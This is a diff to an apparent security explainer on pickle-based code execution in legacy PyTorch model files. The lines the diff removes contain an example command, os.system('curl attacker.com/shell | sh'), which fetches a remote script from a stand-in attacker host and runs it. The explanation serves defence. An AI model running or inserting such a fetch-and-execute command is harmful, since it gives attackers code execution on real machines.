@@ -20,9 +20,10 @@ last_verified: 2026-08-13
 
 Legacy PyTorch model files (`.pkl`, `.pth`, `.bin`) rely on Python's native `pickle` module for object serialization. Pickle is not a static data format—it is a stack-based virtual machine language capable of constructing arbitrary Python objects and invoking system calls during unpickling:
 
-```
-Unpickling Engine ──> Reconstructs Objects ──> Invokes __reduce__() ──> Calls os.system('curl attacker.com/shell | sh')
-```
+<div class="diagram-frame">
+  <img src="{{ '/assets/img/ai-model-supply-chain.svg' | relative_url }}" alt="PyTorch Pickle Arbitrary Code Execution diagram.">
+  <p class="diagram-caption">PyTorch Pickle RCE Mechanism: Unpickling Stack &leftrightarrow; Magic Reduce Method &leftrightarrow; Arbitrary Shell Execution</p>
+</div>
 
 When a application loads a model using `torch.load("model.pkl")`, the unpickler executes any embedded `__reduce__` methods or system calls before returning control to the caller. This enables adversaries to craft backdoored model files that compromise ML inference servers upon model initialization.
 
